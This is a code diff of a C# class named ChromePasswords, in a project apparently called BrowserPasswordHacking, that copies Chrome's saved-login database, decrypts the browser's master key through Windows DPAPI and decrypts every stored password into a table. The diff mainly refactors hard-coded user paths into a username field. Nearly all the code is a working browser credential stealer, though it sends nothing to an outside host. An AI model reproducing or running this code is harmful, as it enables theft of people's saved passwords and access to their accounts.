@@ -14,9 +14,8 @@ namespace BrowserPasswordHacking.Helpers
 {
     public class ChromePasswords
     {
-        private const string LoginsPath = @"C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Default\Login Data";
-        private string TempLoginPath = @"F:\LoginData.db";
-        private const string LoginsKeyPath = @"C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Local State";
+        private readonly string UserName = "Hello";
+        private string TempLoginPath = string.Empty;
         public DataTable Passwords()
         {
             //Create new Datatable for results
@@ -26,16 +25,17 @@ namespace BrowserPasswordHacking.Helpers
             dtResults.Columns.Add("Password");
             try
             {
+                string LoginsPath = @"C:\Users\" + UserName + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
                 //check if file exists or not
                 if (File.Exists(LoginsPath))
                 {
                     //To avoid db lock
+                    TempLoginPath = @"D:\LoginData.db";
                     if (File.Exists(TempLoginPath))
                     {
                         File.Delete(TempLoginPath);
                     }
                     File.Copy(LoginsPath, TempLoginPath);
-
                     //read the file using SQLite
                     using (var conn = new SQLiteConnection($"Data Source={TempLoginPath};"))
                     {
@@ -53,9 +53,8 @@ namespace BrowserPasswordHacking.Helpers
                                     //adding result from logins table
                                     while (reader.Read())
                                     {
-                                        byte[] nonce, cipherText;
                                         var encryptedData = ReadSqLiteBytes(reader, 2);
-                                        TrimData(encryptedData, out nonce, out cipherText);
+                                        TrimData(encryptedData, out byte[] nonce, out byte[] cipherText);
                                         var pass = DecryptPassword(cipherText, key, nonce);
 
                                         DataRow dr = dtResults.NewRow();
@@ -77,11 +76,11 @@ namespace BrowserPasswordHacking.Helpers
             }
             return dtResults;
         }
-
         private byte[] ChromePasswordsKey()
         {
             try
             {
+                string LoginsKeyPath = @"C:\Users\" + UserName + @"\AppData\Local\Google\Chrome\User Data\Local State";
                 if (File.Exists(LoginsKeyPath))
                 {
                     var result = File.ReadAllText(LoginsKeyPath);
@@ -90,12 +89,9 @@ namespace BrowserPasswordHacking.Helpers
                         dynamic json = JsonConvert.DeserializeObject(result);
                         string key = json.os_crypt.encrypted_key;
                         var tempKey = Convert.FromBase64String(key);
-
                         var encTempKey = tempKey.Skip(5).ToArray();
-
                         // Unprotected Key
                         var decryptionkey = ProtectedData.Unprotect(encTempKey, null, DataProtectionScope.CurrentUser);
-
                         // Protected Encryption/Decryption Key
                         return decryptionkey;
                     }
@@ -104,7 +100,6 @@ namespace BrowserPasswordHacking.Helpers
             catch { }
             return null;
         }
-
         private string DecryptPassword(byte[] input, byte[] key, byte[] iv)
         {
             try
@@ -127,7 +122,6 @@ namespace BrowserPasswordHacking.Helpers
             catch { }
             return null;
         }
-
         private byte[] ReadSqLiteBytes(SQLiteDataReader reader, int columnNumber)
         {
             try
@@ -148,8 +142,6 @@ namespace BrowserPasswordHacking.Helpers
             catch { }
             return null;
         }
-
-
         private void TrimData(byte[] encData, out byte[] nonce, out byte[] cipherText)
         {
             nonce = new byte[12];
